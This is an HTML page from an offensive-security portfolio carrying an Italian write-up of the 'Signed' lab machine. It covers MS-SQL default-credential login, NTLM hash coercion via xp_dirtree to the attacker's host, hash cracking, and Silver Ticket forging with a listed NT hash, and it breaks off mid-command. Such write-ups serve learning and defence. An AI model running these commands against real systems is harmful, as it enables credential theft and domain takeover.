@@ -1,0 +1,1180 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Reportistica tecnica, assessment AD/Web/Network, threat modeling e remediation strategy.">
+      
+      
+        <meta name="author" content="Ing. Marco P.">
+      
+      
+        <link rel="canonical" href="https://marcop-sed.github.io/portfolio/signed/">
+      
+      
+        <link rel="prev" href="../darkzero/">
+      
+      
+        <link rel="next" href="../eth/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Kerberos & SQL - Signed - Marco Pulicanò - Offensive Security & Engineering Portfolio</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#scenario-signed-kerberos-abuse-active-directory-compromise" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Marco Pulicanò - Offensive Security &amp; Engineering Portfolio" class="md-header__button md-logo" aria-label="Marco Pulicanò - Offensive Security & Engineering Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Marco Pulicanò - Offensive Security & Engineering Portfolio
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Kerberos & SQL - Signed
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Dark Mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark Mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Light Mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light Mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  🏠 Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../imagery/" class="md-tabs__link">
+          
+  
+  
+  🔴 Offensive Security
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../eth/" class="md-tabs__link">
+          
+  
+  
+  ⚙️ Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Marco Pulicanò - Offensive Security &amp; Engineering Portfolio" class="md-nav__button md-logo" aria-label="Marco Pulicanò - Offensive Security & Engineering Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Marco Pulicanò - Offensive Security & Engineering Portfolio
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏠 Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 Offensive Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🔴 Offensive Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../imagery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Application - Imagery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../expressway/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network & Crypto - Expressway
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../darkzero/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Infrastructure - DarkZero
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos & SQL - Signed
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos & SQL - Signed
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-executive-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Executive Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-reconnaissance-initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Reconnaissance &amp; Initial Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-ntlm-credential-extraction-via-xp_dirtree" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. NTLM Credential Extraction via xp_dirtree
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-hash-cracking-service-account-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Hash Cracking &amp; Service Account Compromise
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-domain-sid-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Domain SID Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-first-silver-ticket-database-admin-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. First Silver Ticket – Database Admin Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-pac-manipulation-second-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. PAC Manipulation &amp; Second Silver Ticket
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-why-this-works-technical-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Why This Works – Technical Breakdown
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-attack-chain-visualization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Attack Chain Visualization
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-remediation-prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Remediation &amp; Prevention
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-key-insights" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11. Key Insights
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⚙️ Projects
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ⚙️ Projects
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../eth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Boot2Root Design - Waifu Gallery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-executive-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Executive Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-reconnaissance-initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Reconnaissance &amp; Initial Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-ntlm-credential-extraction-via-xp_dirtree" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. NTLM Credential Extraction via xp_dirtree
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-hash-cracking-service-account-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Hash Cracking &amp; Service Account Compromise
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-domain-sid-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Domain SID Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-first-silver-ticket-database-admin-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. First Silver Ticket – Database Admin Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-pac-manipulation-second-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. PAC Manipulation &amp; Second Silver Ticket
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-why-this-works-technical-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Why This Works – Technical Breakdown
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-attack-chain-visualization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Attack Chain Visualization
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-remediation-prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Remediation &amp; Prevention
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-key-insights" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11. Key Insights
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="scenario-signed-kerberos-abuse-active-directory-compromise">Scenario "Signed" – Kerberos Abuse &amp; Active Directory Compromise<a class="headerlink" href="#scenario-signed-kerberos-abuse-active-directory-compromise" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>Contesto:</strong> Assessment simulato su infrastruttura AD compromessa partendo da MS-SQL database esposto. L'attacco dimostra come una singola vulnerabilità applicativa possa propagarsi verso compromesso totale del dominio tramite NTLM credential interception e Kerberos Silver Ticket forging.</p>
+</blockquote>
+<p><strong>Data Assessment:</strong> Ottobre 2025<br />
+<strong>Ambiente:</strong> Windows Server + Active Directory + MS-SQL<br />
+<strong>Tipo:</strong> Infrastructure Penetration Testing<br />
+<strong>Risk:</strong> CRITICAL 🔴<br />
+<strong>Metodologia:</strong> PTES + Kerberos exploitation</p>
+<hr />
+<h2 id="1-executive-summary">1. Executive Summary<a class="headerlink" href="#1-executive-summary" title="Permanent link">&para;</a></h2>
+<p>Partendo da MS-SQL esposto su rete con credenziali weak, è stato possibile compromettere completamente l'infrastruttura AD sfruttando una catena di vulnerabilità:</p>
+<ol>
+<li><strong>Database Exposure</strong> – MS-SQL accessibile con credenziali guest</li>
+<li><strong>NTLM Coercion</strong> – Forced SMB authentication via <code>xp_dirtree</code> → hash capture tramite Responder</li>
+<li><strong>Credential Recovery</strong> – Hash NTLMv2 crackato offline, accesso come <code>mssqlsvc</code></li>
+<li><strong>Kerberos Abuse</strong> – Forgiatura di Silver Ticket via PAC manipulation</li>
+<li><strong>Domain Takeover</strong> – Accesso root al file system e leak di flag sensibili</li>
+</ol>
+<p>L'impatto: <strong>Dominio completamente compromesso</strong>, accesso amministrativo, file system access.</p>
+<hr />
+<h2 id="2-reconnaissance-initial-access">2. Reconnaissance &amp; Initial Access<a class="headerlink" href="#2-reconnaissance-initial-access" title="Permanent link">&para;</a></h2>
+<p>Inizio con nmap classica:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>--open<span class="w"> </span>-v<span class="w"> </span>-T4<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.197.161<span class="w"> </span>-oA<span class="w"> </span>Signed
+</code></pre></div>
+<p>Noto da subito che l'unica porta aperta è quella di <code>ms-sql</code> (porta 1433). Test credenziali iniziali:</p>
+<div class="highlight"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>-u<span class="w"> </span>scott<span class="w"> </span>-p<span class="w"> </span>tiger<span class="w"> </span><span class="m">10</span>.129.197.161
+</code></pre></div>
+<p>Perfetto, connessione riuscita. Privilege: utente <code>guest</code>, molto limitato. Non posso lancia query avanzate, ma ho accesso ad una cosa interessante: la stored procedure <code>xp_dirtree</code>.</p>
+<hr />
+<h2 id="3-ntlm-credential-extraction-via-xp_dirtree">3. NTLM Credential Extraction via xp_dirtree<a class="headerlink" href="#3-ntlm-credential-extraction-via-xp_dirtree" title="Permanent link">&para;</a></h2>
+<p>Dato che sono <code>guest</code>, non posso fare una mazza a livello di escalation diretta. Però ho scoperto una tecnica: se uso <code>xp_dirtree</code> puntando a un UNC path inesistente verso il mio IP, il database <strong>lo tenta autenticare via SMB</strong>. E lì, con un Responder in listening, catturi l'hash dell'account di servizio.</p>
+<p>Setup:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0
+</code></pre></div>
+<p>Dal database:</p>
+<div class="highlight"><pre><span></span><code><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.15.35\nonexistent&#39;</span><span class="p">;</span>
+</code></pre></div>
+<p>Responder cattura:</p>
+<div class="highlight"><pre><span></span><code>[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
+[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:1122334455667788:...
+</code></pre></div>
+<p>Hash captured. Perfetto.</p>
+<hr />
+<h2 id="4-hash-cracking-service-account-compromise">4. Hash Cracking &amp; Service Account Compromise<a class="headerlink" href="#4-hash-cracking-service-account-compromise" title="Permanent link">&para;</a></h2>
+<p>Dopo aver salvato l'hash, lo cracko con hashcat, modo 5600 (NTLMv2):</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>mssqlsvc_hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force
+</code></pre></div>
+<p>E grazie alla buona sorte, la password è crackabile. Accesso come <code>mssqlsvc</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>-u<span class="w"> </span>mssqlsvc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EvilPassword123&#39;</span><span class="w"> </span><span class="m">10</span>.129.197.161
+</code></pre></div>
+<p>Output:</p>
+<div class="highlight"><pre><span></span><code>SQL (SIGNED\mssqlsvc  dbo@master)&gt;
+</code></pre></div>
+<p>Ora ho privilegi <code>dbo</code> sul database. Ma c'è un problema: anche se accendo <code>xp_cmdshell</code>, non riesco ad accedere a file sensibili. Perché? Perché il <strong>processo MS-SQL</strong> che esegue i comandi non ha i permessi OS per leggerli.</p>
+<hr />
+<h2 id="5-domain-sid-enumeration">5. Domain SID Enumeration<a class="headerlink" href="#5-domain-sid-enumeration" title="Permanent link">&para;</a></h2>
+<p>Per craftare un Silver Ticket efficace devo estrarre il Domain SID. Query dal database:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">sid</span><span class="p">,</span><span class="w"> </span><span class="k">type</span><span class="p">,</span><span class="w"> </span><span class="n">type_desc</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span><span class="p">;</span>
+<span class="k">GO</span>
+</code></pre></div>
+<p>Output (sample):</p>
+<div class="highlight"><pre><span></span><code>SIGNED\Administrator   | 0x01050000000000051500000...
+SIGNED\Domain Admins   | 0x01050000000000051500000...
+SIGNED\IT              | 0x01050000000000051500000519000C
+</code></pre></div>
+<p>Convertendo i binary SID al formato string (piccolo script Python):</p>
+<div class="highlight"><pre><span></span><code>Domain SID: S-1-5-21-4088429403-1159899800-2753317549
+</code></pre></div>
+<p>Prendo nota.</p>
+<hr />
+<h2 id="6-first-silver-ticket-database-admin-access">6. First Silver Ticket – Database Admin Access<a class="headerlink" href="#6-first-silver-ticket-database-admin-access" title="Permanent link">&para;</a></h2>
+<p>Ora crafto il primo Silver Ticket. L'obiettivo: impersonare Administrator verso MS-SQL, abilitare <code>xp_cmdshell</code>, e leggere il flag utente.</p>
+<div class="highlight"><pre><span></span><code>impacket-ticketer<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-nthash<span class="w"> </span>EF699384C3285C54128A3EE1DDB1A0CC<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-domain-sid<span class="w"> </span>S-1-5-21-4088429403-1159899800-2753317549<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-domain<span class="w"> </span>signed.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-spn<span class="w"> </span>MSSQLSvc/dc01.signed.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-groups<span class="w"> </span><span class="m">1105</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-user-id<span class="w"> </span><span class="m">500</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>Administrator
+</code></pre></div>
+<p>Output:</p>
+<div class="highlight"><pre><span></span><code>[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/Administrator
+[*] Saving ticket in Administrator.ccache
+</code></pre></div>
+<p>Assegno come variabile d'ambiente e connetto:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+impacket-mssqlclient<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>DC01.SIGNED.HTB
+</code></pre></div>
+<p>Risultato:</p>
+<div class="highlight"><pre><span></span><code>SQL (SIGNED\Administrator  dbo@master)&gt;
+enable_xp_cmdshell
+[*] Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1
+
+xp_cmdshell &#39;type C:\Users\scott\Desktop\user.txt&#39;
+HTB{flaghere}
+</code></pre></div>
+<p>User flag ottenuto. Ma quando provo a leggere <code>C:\Users\Administrator\Desktop\root.txt</code>, accesso negato. Perché il processo MS-SQL <strong>non è membro del gruppo Domain Admins a livello OS</strong>.</p>
+<hr />
+<h2 id="7-pac-manipulation-second-silver-ticket">7. PAC Manipulation &amp; Second Silver Ticket<a class="headerlink" href="#7-pac-manipulation-second-silver-ticket" title="Permanent link">&para;</a></h2>
+<p>Dopo aver bestemmiato per una mezz'ora buona, realizzo: devo craftare un secondo ticket che NON sia Administrator, ma sia <code>mssqlsvc</code> <strong>con membership ai gruppi Domain Admins nel PAC</strong>.</p>
+<p>Il PAC (Privilege Attribute Certificate) è la struttura dati dentro il ticket Kerberos che contiene i RID dei gruppi. Se lo forgio manualmente inserendo i RID 512 (Domain Admins) e 519 (Enterprise Admins), il servizio MS-SQL lo truста senza revalidare col KDC.</p>
+<div class="highlight"><pre><span></span><code>impacket-ticketer<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-nthash<span class="w"> </span>EF699384C3285C54128A3EE1DDB1A0CC<span class="w"> </span><span class="se">\</span>
